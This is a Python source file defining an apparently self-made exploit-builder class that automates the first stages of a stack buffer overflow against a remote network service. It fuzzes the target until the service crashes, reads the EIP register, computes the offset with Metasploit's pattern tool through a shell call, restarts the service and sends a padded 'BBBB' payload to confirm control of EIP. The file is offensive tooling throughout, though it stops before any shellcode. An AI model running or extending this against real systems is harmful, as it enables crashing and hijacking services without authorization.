import socket
from subprocess import check_output

from Utils.FancyPrint import fancy_print
from Utils.MsgEnums import MsgEnums
from Utils.GetInput import get_register, restart_service
from Utils.SocketFuzzer import socket_fuzz

class CreateExploit():
    """
    """
    def __init__(self, target:tuple):
        """
        """
        # Connection
        self.ip = target.ip 
        self.port = target.port
        self.rqst_type = target.type
        self.fuzz_amount = target.fuzz_amount
        # Overflow
        self.eip = ""
        self.offset = 0
        self.prefix = target.prefix
        self.crashed = False
        # Misc
        self.DEBUG = False
    
    def __init_fuzz(self):
        """
        """
        # For current DEBUG assuming msf-pattern_create & msf-pattern_offset are usable
        self.offset = socket_fuzz(self.ip, self.port, self.fuzz_amount, self.prefix)
        self.crashed = True

    def __send_data(self, data):
        """
        """
        timeout = 5
        send_string = self.prefix + data
        if(self.DEBUG): print(f"Sending: {send_string}")

        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((self.ip, self.port))
                s.recv(1024)
                s.send(bytes(send_string, "latin-1"))
                s.recv(1024)
        except:
            self.crashed = True
            fancy_print("Service appears to have crashed/not running!", msg_type=MsgEnums.INFO.value)

    def __get_offset(self):
        """
        """
        self.eip = get_register("eip")
        output = check_output(f"msf-pattern_offset -l 1800 -q {self.eip}", shell=True).decode()
        self.offset = int(output.split(' ')[-1].strip())
        fancy_print("Offset Found!", self.offset, MsgEnums.INFO.value)

    
    def __check_offset(self):
        """
        """
        pre_string = "A" * self.offset #0x41
        data = pre_string + "BBBB" #0x42
        self.__send_data(data)


    def start(self):
        """
        """
        self.__init_fuzz()
        if(self.crashed):
            self.__get_offset()
            restart_service()
            self.__check_offset()




